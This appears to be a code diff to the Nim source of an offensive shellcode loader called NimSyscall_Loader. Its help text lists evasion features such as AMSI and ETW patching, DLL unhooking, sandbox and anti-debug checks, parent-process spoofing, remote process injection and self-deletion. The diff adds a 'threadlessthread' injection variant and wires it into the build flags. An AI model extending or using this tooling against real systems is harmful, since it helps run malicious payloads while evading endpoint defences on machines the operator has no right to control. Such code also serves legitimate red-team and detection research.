@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -197,6 +197,7 @@ Options:
       --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
       --remotepatchETW    Patch ETW in the remote process before shellcode execution
   --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
+  --threadlessthread    Use Threadless inject but the trampoline will create a thread instead of CALL to the target address (no impact on the target process but additional IoC)
       --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
       --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
   --poolparty number    Use Poolparty technique 1,2,3,4 for execution
@@ -361,6 +362,7 @@ var
     jmpEntryFunction: string = "RtlpWow64CtxFromAmd64"
     dripallocate: bool = false
     threadless: bool = false
+    threadlessthread: bool = false
     threadlessDll: string = "ntdll.dll"
     threadlessFunc: string = "NtWaitForMultipleObjects" # called regularly by RuntimeBroker.exe which is default spawn inject target.
     suspended: bool = true
@@ -804,6 +806,15 @@ if args["--noDInvoke"]:
 
 if args["--threadless"]:
     threadless = true
+    if(remoteinject):
+        localCreateThread = false
+        useQueueAPC = false
+        callbackexecute = false
+    suspended = false
+
+if args["--threadlessthread"]:
+    threadless = true
+    threadlessthread = true
     if(remoteinject):
         localCreateThread = false
         useQueueAPC = false
@@ -2079,6 +2090,8 @@ when defined(ruylopez):
 #import winim/winstr
 #import winim/utils
 #from winim import winstr,winimbase,windef
+when defined(stomb):
+    import cfgadd
 when defined(DInvoke):
     from packerutils import MyRtlGetCurrentPeb
 when defined(AntiDebug):
@@ -4290,6 +4303,9 @@ if(threadless):
 if(usepoolparty):
     basicCompileFlags.add("-d:poolparty ")
     basicCompileFlags.add(fmt"-d:variant{poolparty} ")
+
+if (threadlessthread):
+    basicCompileFlags.add("-d:threadlessthread ")
 
 if(dllProxy):
     when system.hostOS == "windows":
